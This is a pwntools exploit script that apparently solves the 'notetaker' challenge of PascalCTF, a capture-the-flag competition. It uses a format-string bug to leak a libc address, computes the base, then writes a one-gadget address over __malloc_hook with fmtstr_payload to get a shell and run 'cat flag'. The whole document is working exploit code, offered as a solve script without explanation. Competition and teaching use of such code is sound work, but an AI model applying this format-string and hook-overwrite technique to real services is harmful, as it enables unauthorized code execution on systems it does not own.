#!/usr/bin/env python3

import os
from pwn import *
import logging
logging.disable()

HOST = os.environ.get("HOST", "notetaker.ctf.pascalctf.it")
PORT = int(os.environ.get("PORT", 9002))
GADGET = 0xf03a4

context.arch = 'amd64'

def main():
   r = remote(HOST, PORT)

   r.sendlineafter(b'> ', b'2')
   r.sendlineafter(b': ', b'%9$sAAAA' + p64(0x601fb0))
   r.sendlineafter(b'> ', b'1')
   a = u64(r.recv(6).ljust(8, b'\x00'))
   # print(f"Leaked address: {hex(a)}")
   libcaddr = a - 0x55810 # libc.address = a - libc.symbols['printf']
   malloc_hook = libcaddr + 0x3c4b10 # libc.symbols['__malloc_hook']
   # print(f"Malloc hook: {hex(malloc_hook)}")

   # print(f"Gadget: {hex(libcaddr + GADGET)}")
   payload = fmtstr_payload(8, {
      malloc_hook: libcaddr + GADGET
   }, write_size='short')

   r.sendlineafter(b'> ', b'3')
   r.sendlineafter(b'> ', b'2')
   r.sendafter(b': ', payload)
   r.sendlineafter(b'> ', b'1')
   r.sendlineafter(b'> ', b'3')
   
   r.sendline(b"cat flag")
   print(r.recvline().decode().strip())
   r.close()

if __name__ == "__main__":
   main()
